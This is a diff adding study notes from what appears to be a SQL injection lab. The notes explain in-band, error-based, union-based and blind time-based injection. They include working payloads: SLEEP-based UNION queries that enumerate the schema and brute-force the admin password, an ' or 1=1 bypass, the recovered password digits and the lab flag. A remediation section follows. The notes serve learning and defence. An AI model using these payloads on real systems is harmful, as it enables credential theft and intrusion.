@@ -883,15 +883,64 @@ there are 3 types in total
 - Blind 
 - Out Of Band 
 
+### IN-BAND SQLi
 
+**In-Band SQL Injection**  
+In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.
 
+**Error-Based SQL Injection**  
+This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database.
 
+**Union-Based SQL Injection**  
+This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.
 
+> retry, go back, revisit, internalize
 
+Finished the Challenge but the `UNION` Commands did not stick with me
 
+### BLIND SQLI - AUTHENTICATION BYPASS 
 
+Blind SQLi
+Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successful enumerate a whole database.
 
+### BLIND SQLI - TIMEBASED 
 
+```
+# working 
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(1),2 where database() like 'sqli_four%';-- 
+
+# WORKING 
+admin123' UNION SELECT SLEEP(1),2 where database() like 'sqli_four%';-- 
+
+admin123' UNION SELECT SLEEP(1),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+admin123' UNION SELECT SLEEP(1),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+
+# WORKING
+https://website.thm/analytics?referrer= referrer=admin123' UNION SELECT SLEEP(1),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users'; 
+
+admin123' UNION SELECT SLEEP(1),2 from users where username='admin' and password like 'a% 
+
+# works 
+# Manually bruteforced digits 4, 41,42, etc until i got 
+# 4961
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 from users where username='admin' and password like '4961%
+
+The answer
+THM{SQL_INJECTION_MASTER} 
+```
+
+### Remediation 
+Remediation
+As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the below advice:
+
+Prepared Statements (With Parameterized Queries):
+In a prepared query, the first thing a developer writes is the SQL query and then any user inputs are added as a parameter afterwards. Writing prepared statements ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look a lot cleaner and easier to read.
+
+Input Validation:
+Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow.
+
+Escaping User Input:
+Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.
 
 
 ---
@@ -952,8 +1001,15 @@ can you pollute it?
 In this example in PHP  `$_REQUEST`, `function.inclue` and `file_get_contents` 
 are the functions that got exploited. 
 
+**SQLI**  
+```sql
+# this will always return true 
+' or 1=1;--
 
+# to discover database name
+database()  
+# example with union 
 
+admin123' union select 1,2,3 where database() like '%';-- 
 
-
-
+```
